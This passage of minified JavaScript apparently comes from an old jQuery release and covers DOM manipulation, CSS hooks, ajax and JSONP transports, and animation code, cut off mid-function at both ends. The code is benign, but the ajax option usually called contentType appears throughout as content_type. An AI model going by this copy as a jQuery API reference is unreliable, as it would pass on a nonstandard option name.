jQuery\d+="(?:\d+|null)"/g,X=/^\s+/,Y=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,Z=/<([\w:]+)/,$=/<tbody/i,_=/<|&#?\w+;/,ba=/<(?:script|object|embed|option|style)/i,bb=/checked\s*(?:[^=]|=\s*.checked.)/i,bc=/\/(java|ecma)script/i,bd=/^\s*<!(?:\[CDATA\[|\-\-)/,be={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]};be.optgroup=be.option,be.tbody=be.tfoot=be.colgroup=be.caption=be.thead,be.th=be.td,f.support.htmlSerialize||(be._default=[1,"div<div>","</div>"]),f.fn.extend({text:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.text(a.call(this,b,c.text()))});if(typeof a!="object"&&a!==b)return this.empty().append((this[0]&&this[0].ownerDocument||c).createTextNode(a));return f.text(this)},wrapAll:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapAll(a.call(this,b))});if(this[0]){var b=f(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&a.firstChild.nodeType===1)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapInner(a.call(this,b))});return this.each(function(){var b=f(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){return this.each(function(){f(this).wrapAll(a)})},unwrap:function(){return this.parent().each(function(){f.nodeName(this,"body")||f(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});if(arguments.length){var a=f(arguments[0]);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,f(arguments[0]).toArray());return a}},remove:function(a,b){for(var c=0,d;(d=this[c])!=null;c++)if(!a||f.filter(a,[d]).length)!b&&d.nodeType===1&&(f.cleanData(d.getElementsByTagName("*")),f.cleanData([d])),d.parentNode&&d.parentNode.removeChild(d);return this},empty:function(){for(var a=0,b;(b=this[a])!=null;a++){b.nodeType===1&&f.cleanData(b.getElementsByTagName("*"));while(b.firstChild)b.removeChild(b.firstChild)}return this},clone:function(a,b){a=a==null?!1:a,b=b==null?a:b;return this.map(function(){return f.clone(this,a,b)})},html:function(a){if(a===b)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(W,""):null;if(typeof a=="string"&&!ba.test(a)&&(f.support.leadingWhitespace||!X.test(a))&&!be[(Z.exec(a)||["",""])[1].toLowerCase()]){a=a.replace(Y,"<$1></$2>");try{for(var c=0,d=this.length;c<d;c++)this[c].nodeType===1&&(f.cleanData(this[c].getElementsByTagName("*")),this[c].innerHTML=a)}catch(e){this.empty().append(a)}}else f.isFunction(a)?this.each(function(b){var c=f(this);c.html(a.call(this,b,c.html()))}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(f.isFunction(a))return this.each(function(b){var c=f(this),d=c.html();c.replaceWith(a.call(this,b,d))});typeof a!="string"&&(a=f(a).detach());return this.each(function(){var b=this.nextSibling,c=this.parentNode;f(this).remove(),b?f(b).before(a):f(c).append(a)})}return this.length?this.pushStack(f(f.isFunction(a)?a():a),"replaceWith",a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,d){var e,g,h,i,j=a[0],k=[];if(!f.support.checkClone&&arguments.length===3&&typeof j=="string"&&bb.test(j))return this.each(function(){f(this).domManip(a,c,d,!0)});if(f.isFunction(j))return this.each(function(e){var g=f(this);a[0]=j.call(this,e,c?g.html():b),g.domManip(a,c,d)});if(this[0]){i=j&&j.parentNode,f.support.parentNode&&i&&i.nodeType===11&&i.childNodes.length===this.length?e={fragment:i}:e=f.buildFragment(a,this,k),h=e.fragment,h.childNodes.length===1?g=h=h.firstChild:g=h.firstChild;if(g){c=c&&f.nodeName(g,"tr");for(var l=0,m=this.length,n=m-1;l<m;l++)d.call(c?bf(this[l],g):this[l],e.cacheable||m>1&&l<n?f.clone(h,!0,!0):h)}k.length&&f.each(k,bl)}return this}}),f.buildFragment=function(a,b,d){var e,g,h,i;b&&b[0]&&(i=b[0].ownerDocument||b[0]),i.createDocumentFragment||(i=c),a.length===1&&typeof a[0]=="string"&&a[0].length<512&&i===c&&a[0].charAt(0)==="<"&&!ba.test(a[0])&&(f.support.checkClone||!bb.test(a[0]))&&(g=!0,h=f.fragments[a[0]],h&&h!==1&&(e=h)),e||(e=i.createDocumentFragment(),f.clean(a,i,e,d)),g&&(f.fragments[a[0]]=h?e:1);return{fragment:e,cacheable:g}},f.fragments={},f.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){f.fn[a]=function(c){var d=[],e=f(c),g=this.length===1&&this[0].parentNode;if(g&&g.nodeType===11&&g.childNodes.length===1&&e.length===1){e[b](this[0]);return this}for(var h=0,i=e.length;h<i;h++){var j=(h>0?this.clone(!0):this).get();f(e[h])[b](j),d=d.concat(j)}return this.pushStack(d,a,e.selector)}}),f.extend({clone:function(a,b,c){var d=a.cloneNode(!0),e,g,h;if((!f.support.noCloneEvent||!f.support.noCloneChecked)&&(a.nodeType===1||a.nodeType===11)&&!f.isXMLDoc(a)){bh(a,d),e=bi(a),g=bi(d);for(h=0;e[h];++h)g[h]&&bh(e[h],g[h])}if(b){bg(a,d);if(c){e=bi(a),g=bi(d);for(h=0;e[h];++h)bg(e[h],g[h])}}e=g=null;return d},clean:function(a,b,d,e){var g;b=b||c,typeof b.createElement=="undefined"&&(b=b.ownerDocument||b[0]&&b[0].ownerDocument||c);var h=[],i;for(var j=0,k;(k=a[j])!=null;j++){typeof k=="number"&&(k+="");if(!k)continue;if(typeof k=="string")if(!_.test(k))k=b.createTextNode(k);else{k=k.replace(Y,"<$1></$2>");var l=(Z.exec(k)||["",""])[1].toLowerCase(),m=be[l]||be._default,n=m[0],o=b.createElement("div");o.innerHTML=m[1]+k+m[2];while(n--)o=o.lastChild;if(!f.support.tbody){var p=$.test(k),q=l==="table"&&!p?o.firstChild&&o.firstChild.childNodes:m[1]==="<table>"&&!p?o.childNodes:[];for(i=q.length-1;i>=0;--i)f.nodeName(q[i],"tbody")&&!q[i].childNodes.length&&q[i].parentNode.removeChild(q[i])}!f.support.leadingWhitespace&&X.test(k)&&o.insertBefore(b.createTextNode(X.exec(k)[0]),o.firstChild),k=o.childNodes}var r;if(!f.support.appendChecked)if(k[0]&&typeof (r=k.length)=="number")for(i=0;i<r;i++)bk(k[i]);else bk(k);k.nodeType?h.push(k):h=f.merge(h,k)}if(d){g=function(a){return!a.type||bc.test(a.type)};for(j=0;h[j];j++)if(e&&f.nodeName(h[j],"script")&&(!h[j].type||h[j].type.toLowerCase()==="text/javascript"))e.push(h[j].parentNode?h[j].parentNode.removeChild(h[j]):h[j]);else{if(h[j].nodeType===1){var s=f.grep(h[j].getElementsByTagName("script"),g);h.splice.apply(h,[j+1,0].concat(s))}d.appendChild(h[j])}}return h},cleanData:function(a){var b,c,d=f.cache,e=f.expando,g=f.event.special,h=f.support.deleteExpando;for(var i=0,j;(j=a[i])!=null;i++){if(j.nodeName&&f.noData[j.nodeName.toLowerCase()])continue;c=j[f.expando];if(c){b=d[c]&&d[c][e];if(b&&b.events){for(var k in b.events)g[k]?f.event.remove(j,k):f.removeEvent(j,k,b.handle);b.handle&&(b.handle.elem=null)}h?delete j[f.expando]:j.removeAttribute&&j.removeAttribute(f.expando),delete d[c]}}}});var bm=/alpha\([^)]*\)/i,bn=/opacity=([^)]*)/,bo=/([A-Z]|^ms)/g,bp=/^-?\d+(?:px)?$/i,bq=/^-?\d/,br=/^([\-+])=([\-+.\de]+)/,bs={position:"absolute",visibility:"hidden",display:"block"},bt=["Left","Right"],bu=["Top","Bottom"],bv,bw,bx;f.fn.css=function(a,c){if(arguments.length===2&&c===b)return this;return f.access(this,a,c,!0,function(a,c,d){return d!==b?f.style(a,c,d):f.css(a,c)})},f.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=bv(a,"opacity","opacity");return c===""?"1":c}return a.style.opacity}}},cssNumber:{fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":f.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,c,d,e){if(!!a&&a.nodeType!==3&&a.nodeType!==8&&!!a.style){var g,h,i=f.camelCase(c),j=a.style,k=f.cssHooks[i];c=f.cssProps[i]||i;if(d===b){if(k&&"get"in k&&(g=k.get(a,!1,e))!==b)return g;return j[c]}h=typeof d,h==="string"&&(g=br.exec(d))&&(d=+(g[1]+1)*+g[2]+parseFloat(f.css(a,c)),h="number");if(d==null||h==="number"&&isNaN(d))return;h==="number"&&!f.cssNumber[i]&&(d+="px");if(!k||!("set"in k)||(d=k.set(a,d))!==b)try{j[c]=d}catch(l){}}},css:function(a,c,d){var e,g;c=f.camelCase(c),g=f.cssHooks[c],c=f.cssProps[c]||c,c==="cssFloat"&&(c="float");if(g&&"get"in g&&(e=g.get(a,!0,d))!==b)return e;if(bv)return bv(a,c)},swap:function(a,b,c){var d={};for(var e in b)d[e]=a.style[e],a.style[e]=b[e];c.call(a);for(e in b)a.style[e]=d[e]}}),f.curCSS=f.css,f.each(["height","width"],function(a,b){f.cssHooks[b]={get:function(a,c,d){var e;if(c){if(a.offsetWidth!==0)return by(a,b,d);f.swap(a,bs,function(){e=by(a,b,d)});return e}},set:function(a,b){if(!bp.test(b))return b;b=parseFloat(b);if(b>=0)return b+"px"}}}),f.support.opacity||(f.cssHooks.opacity={get:function(a,b){return bn.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle,e=f.isNaN(b)?"":"alpha(opacity="+b*100+")",g=d&&d.filter||c.filter||"";c.zoom=1;if(b>=1&&f.trim(g.replace(bm,""))===""){c.removeAttribute("filter");if(d&&!d.filter)return}c.filter=bm.test(g)?g.replace(bm,e):g+" "+e}}),f(function(){f.support.reliableMarginRight||(f.cssHooks.marginRight={get:function(a,b){var c;f.swap(a,{display:"inline-block"},function(){b?c=bv(a,"margin-right","marginRight"):c=a.style.marginRight});return c}})}),c.defaultView&&c.defaultView.getComputedStyle&&(bw=function(a,c){var d,e,g;c=c.replace(bo,"-$1").toLowerCase();if(!(e=a.ownerDocument.defaultView))return b;if(g=e.getComputedStyle(a,null))d=g.getPropertyValue(c),d===""&&!f.contains(a.ownerDocument.documentElement,a)&&(d=f.style(a,c));return d}),c.documentElement.currentStyle&&(bx=function(a,b){var c,d=a.currentStyle&&a.currentStyle[b],e=a.runtimeStyle&&a.runtimeStyle[b],f=a.style;!bp.test(d)&&bq.test(d)&&(c=f.left,e&&(a.runtimeStyle.left=a.currentStyle.left),f.left=b==="fontSize"?"1em":d||0,d=f.pixelLeft+"px",f.left=c,e&&(a.runtimeStyle.left=e));return d===""?"auto":d}),bv=bw||bx,f.expr&&f.expr.filters&&(f.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;return b===0&&c===0||!f.support.reliableHiddenOffsets&&(a.style.display||f.css(a,"display"))==="none"},f.expr.filters.visible=function(a){return!f.expr.filters.hidden(a)});var bz=/%20/g,bA=/\[\]$/,bB=/\r?\n/g,bC=/#.*$/,bD=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,bE=/^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,bF=/^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/,bG=/^(?:GET|HEAD)$/,bH=/^\/\//,bI=/\?/,bJ=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,bK=/^(?:select|textarea)/i,bL=/\s+/,bM=/([?&])_=[^&]*/,bN=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,bO=f.fn.load,bP={},bQ={},bR,bS,bT=["*/"]+["*"];try{bR=e.href}catch(bU){bR=c.createElement("a"),bR.href="",bR=bR.href}bS=bN.exec(bR.toLowerCase())||[],f.fn.extend({load:function(a,c,d){if(typeof a!="string"&&bO)return bO.apply(this,arguments);if(!this.length)return this;var e=a.indexOf(" ");if(e>=0){var g=a.slice(e,a.length);a=a.slice(0,e)}var h="GET";c&&(f.isFunction(c)?(d=c,c=b):typeof c=="object"&&(c=f.param(c,f.ajaxSettings.traditional),h="POST"));var i=this;f.ajax({url:a,type:h,dataType:"html",data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&&(a.done(function(a){c=a}),i.html(g?f("<div>").append(c.replace(bJ,"")).find(g):c)),d&&i.each(d,[c,b,a])}});return this},serialize:function(){return f.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?f.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||bK.test(this.nodeName)||bE.test(this.type))}).map(function(a,b){var c=f(this).val();return c==null?null:f.isArray(c)?f.map(c,function(a,c){return{name:b.name,value:a.replace(bB,"\r\n")}}):{name:b.name,value:c.replace(bB,"\r\n")}}).get()}}),f.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){f.fn[b]=function(a){return this.bind(b,a)}}),f.each(["get","post"],function(a,c){f[c]=function(a,d,e,g){f.isFunction(d)&&(g=g||e,e=d,d=b);return f.ajax({type:c,url:a,data:d,success:e,dataType:g})}}),f.extend({getScript:function(a,c){return f.get(a,b,c,"script")},getJSON:function(a,b,c){return f.get(a,b,c,"json")},ajaxSetup:function(a,b){b?bX(a,f.ajaxSettings):(b=a,a=f.ajaxSettings),bX(a,b);return a},ajaxSettings:{url:bR,isLocal:bF.test(bS[1]),global:!0,type:"GET",content_type:"application/x-www-form-urlencoded",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":bT},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":a.String,"text html":!0,"text json":f.parseJSON,"text xml":f.parseXML},flatOptions:{context:!0,url:!0}},ajaxPrefilter:bV(bP),ajaxTransport:bV(bQ),ajax:function(a,c){function w(a,c,l,m){if(s!==2){s=2,q&&clearTimeout(q),p=b,n=m||"",v.readyState=a>0?4:0;var o,r,u,w=c,x=l?bZ(d,v,l):b,y,z;if(a>=200&&a<300||a===304){if(d.ifModified){if(y=v.getResponseHeader("Last-Modified"))f.lastModified[k]=y;if(z=v.getResponseHeader("Etag"))f.etag[k]=z}if(a===304)w="notmodified",o=!0;else try{r=b$(d,x),w="success",o=!0}catch(A){w="parsererror",u=A}}else{u=w;if(!w||a)w="error",a<0&&(a=0)}v.status=a,v.statusText=""+(c||w),o?h.resolveWith(e,[r,w,v]):h.rejectWith(e,[v,w,u]),v.statusCode(j),j=b,t&&g.trigger("ajax"+(o?"Success":"Error"),[v,d,o?r:u]),i.resolveWith(e,[v,w]),t&&(g.trigger("ajaxComplete",[v,d]),--f.active||f.event.trigger("ajaxStop"))}}typeof a=="object"&&(c=a,a=b),c=c||{};var d=f.ajaxSetup({},c),e=d.context||d,g=e!==d&&(e.nodeType||e instanceof f)?f(e):f.event,h=f.Deferred(),i=f._Deferred(),j=d.statusCode||{},k,l={},m={},n,o,p,q,r,s=0,t,u,v={readyState:0,setRequestHeader:function(a,b){if(!s){var c=a.toLowerCase();a=m[c]=m[c]||a,l[a]=b}return this},getAllResponseHeaders:function(){return s===2?n:null},getResponseHeader:function(a){var c;if(s===2){if(!o){o={};while(c=bD.exec(n))o[c[1].toLowerCase()]=c[2]}c=o[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){s||(d.mimeType=a);return this},abort:function(a){a=a||"abort",p&&p.abort(a),w(0,a);return this}};h.promise(v),v.success=v.done,v.error=v.fail,v.complete=i.done,v.statusCode=function(a){if(a){var b;if(s<2)for(b in a)j[b]=[j[b],a[b]];else b=a[v.status],v.then(b,b)}return this},d.url=((a||d.url)+"").replace(bC,"").replace(bH,bS[1]+"//"),d.dataTypes=f.trim(d.dataType||"*").toLowerCase().split(bL),d.crossDomain==null&&(r=bN.exec(d.url.toLowerCase()),d.crossDomain=!(!r||r[1]==bS[1]&&r[2]==bS[2]&&(r[3]||(r[1]==="http:"?80:443))==(bS[3]||(bS[1]==="http:"?80:443)))),d.data&&d.processData&&typeof d.data!="string"&&(d.data=f.param(d.data,d.traditional)),bW(bP,d,c,v);if(s===2)return!1;t=d.global,d.type=d.type.toUpperCase(),d.hasContent=!bG.test(d.type),t&&f.active++===0&&f.event.trigger("ajaxStart");if(!d.hasContent){d.data&&(d.url+=(bI.test(d.url)?"&":"?")+d.data,delete d.data),k=d.url;if(d.cache===!1){var x=f.now(),y=d.url.replace(bM,"$1_="+x);d.url=y+(y===d.url?(bI.test(d.url)?"&":"?")+"_="+x:"")}}(d.data&&d.hasContent&&d.content_type!==!1||c.content_type)&&v.setRequestHeader("Content-Type",d.content_type),d.ifModified&&(k=k||d.url,f.lastModified[k]&&v.setRequestHeader("If-Modified-Since",f.lastModified[k]),f.etag[k]&&v.setRequestHeader("If-None-Match",f.etag[k])),v.setRequestHeader("Accept",d.dataTypes[0]&&d.accepts[d.dataTypes[0]]?d.accepts[d.dataTypes[0]]+(d.dataTypes[0]!=="*"?", "+bT+"; q=0.01":""):d.accepts["*"]);for(u in d.headers)v.setRequestHeader(u,d.headers[u]);if(d.beforeSend&&(d.beforeSend.call(e,v,d)===!1||s===2)){v.abort();return!1}for(u in{success:1,error:1,complete:1})v[u](d[u]);p=bW(bQ,d,c,v);if(!p)w(-1,"No Transport");else{v.readyState=1,t&&g.trigger("ajaxSend",[v,d]),d.async&&d.timeout>0&&(q=setTimeout(function(){v.abort("timeout")},d.timeout));try{s=1,p.send(l,w)}catch(z){s<2?w(-1,z):f.error(z)}}return v},param:function(a,c){var d=[],e=function(a,b){b=f.isFunction(b)?b():b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};c===b&&(c=f.ajaxSettings.traditional);if(f.isArray(a)||a.jquery&&!f.isPlainObject(a))f.each(a,function(){e(this.name,this.value)});else for(var g in a)bY(g,a[g],c,e);return d.join("&").replace(bz,"+")}}),f.extend({active:0,lastModified:{},etag:{}});var b_=f.now(),ca=/(\=)\?(&|$)|\?\?/i;f.ajaxSetup({jsonp:"callback",jsonpCallback:function(){return f.expando+"_"+b_++}}),f.ajaxPrefilter("json jsonp",function(b,c,d){var e=b.content_type==="application/x-www-form-urlencoded"&&typeof b.data=="string";if(b.dataTypes[0]==="jsonp"||b.jsonp!==!1&&(ca.test(b.url)||e&&ca.test(b.data))){var g,h=b.jsonpCallback=f.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,i=a[h],j=b.url,k=b.data,l="$1"+h+"$2";b.jsonp!==!1&&(j=j.replace(ca,l),b.url===j&&(e&&(k=k.replace(ca,l)),b.data===k&&(j+=(/\?/.test(j)?"&":"?")+b.jsonp+"="+h))),b.url=j,b.data=k,a[h]=function(a){g=[a]},d.always(function(){a[h]=i,g&&f.isFunction(i)&&a[h](g[0])}),b.converters["script json"]=function(){g||f.error(h+" was not called");return g[0]},b.dataTypes[0]="json";return"script"}}),f.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(a){f.globalEval(a);return a}}}),f.ajaxPrefilter("script",function(a){a.cache===b&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),f.ajaxTransport("script",function(a){if(a.crossDomain){var d,e=c.head||c.getElementsByTagName("head")[0]||c.documentElement;return{send:function(f,g){d=c.createElement("script"),d.async="async",a.scriptCharset&&(d.charset=a.scriptCharset),d.src=a.url,d.onload=d.onreadystatechange=function(a,c){if(c||!d.readyState||/loaded|complete/.test(d.readyState))d.onload=d.onreadystatechange=null,e&&d.parentNode&&e.removeChild(d),d=b,c||g(200,"success")},e.insertBefore(d,e.firstChild)},abort:function(){d&&d.onload(0,1)}}}});var cb=a.ActiveXObject?function(){for(var a in cd)cd[a](0,1)}:!1,cc=0,cd;f.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&&ce()||cf()}:ce,function(a){f.extend(f.support,{ajax:!!a,cors:!!a&&"withCredentials"in a})}(f.ajaxSettings.xhr()),f.support.ajax&&f.ajaxTransport(function(c){if(!c.crossDomain||f.support.cors){var d;return{send:function(e,g){var h=c.xhr(),i,j;c.username?h.open(c.type,c.url,c.async,c.username,c.password):h.open(c.type,c.url,c.async);if(c.xhrFields)for(j in c.xhrFields)h[j]=c.xhrFields[j];c.mimeType&&h.overrideMimeType&&h.overrideMimeType(c.mimeType),!c.crossDomain&&!e["X-Requested-With"]&&(e["X-Requested-With"]="XMLHttpRequest");try{for(j in e)h.setRequestHeader(j,e[j])}catch(k){}h.send(c.hasContent&&c.data||null),d=function(a,e){var j,k,l,m,n;try{if(d&&(e||h.readyState===4)){d=b,i&&(h.onreadystatechange=f.noop,cb&&delete cd[i]);if(e)h.readyState!==4&&h.abort();else{j=h.status,l=h.getAllResponseHeaders(),m={},n=h.responseXML,n&&n.documentElement&&(m.xml=n),m.text=h.responseText;try{k=h.statusText}catch(o){k=""}!j&&c.isLocal&&!c.crossDomain?j=m.text?200:404:j===1223&&(j=204)}}}catch(p){e||g(-1,p)}m&&g(j,k,m,l)},!c.async||h.readyState===4?d():(i=++cc,cb&&(cd||(cd={},f(a).unload(cb)),cd[i]=d),h.onreadystatechange=d)},abort:function(){d&&d(0,1)}}}});var cg={},ch,ci,cj=/^(?:toggle|show|hide)$/,ck=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,cl,cm=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]],cn;f.fn.extend({show:function(a,b,c){var d,e;if(a||a===0)return this.animate(cq("show",3),a,b,c);for(var g=0,h=this.length;g<h;g++)d=this[g],d.style&&(e=d.style.display,!f._data(d,"olddisplay")&&e==="none"&&(e=d.style.display=""),e===""&&f.css(d,"display")==="none"&&f._data(d,"olddisplay",cr(d.nodeName)));for(g=0;g<h;g++){d=this[g];if(d.style){e=d.style.display;if(e===""||e==="none")d.style.display=f._data(d,"olddisplay")||""}}return this},hide:function(a,b,c){if(a||a===0)return this.animate(cq("hide",3),a,b,c);for(var d=0,e=this.length;d<e;d++)if(this[d].style){var g=f.css(this[d],"display");g!=="none"&&!f._data(this[d],"olddisplay")&&f._data(this[d],"olddisplay",g)}for(d=0;d<e;d++)this[d].style&&(this[d].style.display="none");return this},_toggle:f.fn.toggle,toggle:function(a,b,c){var d=typeof a=="boolean";f.isFunction(a)&&f.isFunction(b)?this._toggle.apply(this,arguments):a==null||d?this.each(function(){var b=d?a:f(this).is(":hidden");f(this)[b?"show":"hide"]()}):this.animate(cq("toggle",3),a,b,c);return this},fadeTo:function(a,b,c,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){var e=f.speed(b,c,d);if(f.isEmptyObject(a))return this.each(e.complete,[!1]);a=f.extend({},a);return this[e.queue===!1?"each":"queue"](function(){e.queue===!1&&f._mark(this);var b=f.extend({},e),c=this.nodeType===1,d=c&&f(this).is(":hidden"),g,h,i,j,k,l,m,n,o;b.animatedProperties={};for(i in a){g=f.camelCase(i),i!==g&&(a[g]=a[i],delete a[i]),h=a[g],f.isArray(h)?(b.animatedProperties[g]=h[1],h=a[g]=h[0]):b.animatedProperties[g]=b.specialEasing&&b.specialEasing[g]||b.easing||"swing";if(h==="hide"&&d||h==="show"&&!d)return b.complete.call(this);c&&(g==="height"||g==="width")&&(b.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY],f.css(this,"display")==="inline"&&f.css(this,"float")==="none"&&(f.support.inlineBlockNeedsLayout?(j=cr(this.nodeName),j==="inline"?this.style.display="inline-block":(this.style.display="inline",this.style.zoom=1)):this.style.display="inline-block"))}b.overflow!=null&&(this.style.overflow="hidden");for(i in a)k=new f.fx(this,b,i),h=a[i],cj.test(h)?k[h==="toggle"?d?"show":"hide":h]():(l=ck.exec(h),m=k.cur(),l?(n=parseFloat(l[2]),o=l[3]||(f.cssNumber[i]?"":"px"),o!=="px"&&(f.style(this,i,(n||1)+o),m=(n||1)/k.cur()*m,f.style(this,i,m+o)),l[1]&&(n=(l[1]==="-="?-1:1)*n+m),k.custom(m,n,o)):k.custom(m,h,""));return!0})},stop:function(a,b){a&&this.queue([]),this.each(function(){var a=f.timers,c=a.length;b||f._unmark(!0,this);while(c--)a[c].elem===this&&(b&&a[c](!0),a.splice(c,1))}),b||this.dequeue();return this}}),f.each({slideDown:cq("show",1),slideUp:cq("hide",1),slideToggle:cq("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){f.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),f.extend({speed:function(a,b,c){var d=a&&typeof a=="object"?f.extend({},a):{complete:c||!c&&b||f.isFunction(a)&&a,duration:a,easing:c&&b||b&&!f.isFunction(b)&&b};d.duration=f.fx.off?0:typeof d.duration=="number"?d.duration:d.duration in f.fx.speeds?f.fx.speeds[d.duration]:f.fx.speeds._default,d.old=d.complete,d.complete=function(a){f.isFunction(d.old)&&d.old.call(this),d.queue!==!1?f.dequeue(this):a!==!1&&f._unmark(this)};return d},easing:{linear:function(a,b,c,d){return c+d*a},swing:function(a,b,c,d){return(-Math.cos(a*Math.PI)/2+.5)*d+c}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig=b.orig||{}}}),f.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this),(f.fx.step[this.prop]||f.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a,b=f.css(this.elem,this.prop);return isNaN(a=parseFloat(b))?!b||b==="auto"?0:b:a},custom:function(a,b,c){function g(a){return d.step(a)}var d=this,e=f.fx;this.startTime=cn||co(),this.start=a,this.end=b,this.unit=c||this.unit||(f.cssNumber[this.prop]?"":"px"),this.now=this.start,this.pos=this.state=0,g.elem=this.elem,g()&&f.timers.push(g)&&!cl&&(cl=setInterval(e.tick,e.interval))},show:function(){this.options.orig[this.prop]=f.style(this.elem,this.prop),this.options.show=!0,this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur()),f(this.elem).show()},hide:function(){this.options.orig[this.prop]=f.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var b=cn||co(),c=!0,d=this.elem,e=this.options,g,h;if(a||b>=e.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),e.animatedProperties[this.prop]=!0;for(g in e.animatedProperties)e.animatedProperties[g]!==!0&&(c=!1);if(c){e.overflow!=null&&!f.support.shrinkWrapBlocks&&f.each(["","X","Y"],function(a,b){d.style["overflow"+b]=e.overflow[a]}),e.hide&&f(d).hide();if(e.hide||e.show)for(var i in e.animatedProperties)f.style(d,i,e.orig[i]);e.complete.call(d)}return!1}e.duration==Infinity?this.now=b:(h=b-this.startTime,this.state=h/e.duration,this.pos=f.easing[e.animatedProperties[this.prop]](this.state,h,0,1,e.duration),this.now=this.start+(this.end-this.start)*this.pos),this.update();return!0}},f.extend(f.fx,{tick:function(){for(var a=f.timers,b=0;b<a.length;++b)a[b]()||a.splice(b--,1);a.length||f.fx.stop()},interval:13,stop:function(){clearInterval(cl),cl=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){f.style(a.elem,"opacity",a.now)},_default:function(a){a.elem.style&&a.elem.style[a.prop]!=null?a.elem.style[a.prop]=(a.prop==="width"||a.prop==="height"?Math.max(0,a.now):a.now)+a.unit:a.elem[a.prop]=a.now}}}),f.expr&&f.expr.filters&&(f.expr.filters.animated=function(a){return f.grep(f.timers,function(b){return a===b.elem}).length});var cs=/^t(?:able|d|h)$/i,ct=/^(?:body|html)$/i;"getBoundingClientRect"in c.documentElement?f.fn.offset=function(a){var b=this[0],c;if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);try{c=b.getBoundingClientRect()}catch(d){}var e=b.ownerDocument,g=e.documentElement;if(!c||!f.contains(g,b))return c?{top:c.top,left:c.left}:{top:0,left:0};var h=e.body,i=cu(e),j=g.clientTop||h.clientTop||0,k=g.clientLeft||h.clientLeft||0,l=i.pageYOffset||f.support.boxModel&&g.scrollTop||h.scrollTop,m=i.pageXOffset||f.support.boxModel&&g.scrollLeft||h.scrollLeft,n=c.top+l-j,o=c.left+m-k;return{top:n,left:o}}:f.fn.offset=function(a){var b=this[0];if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return 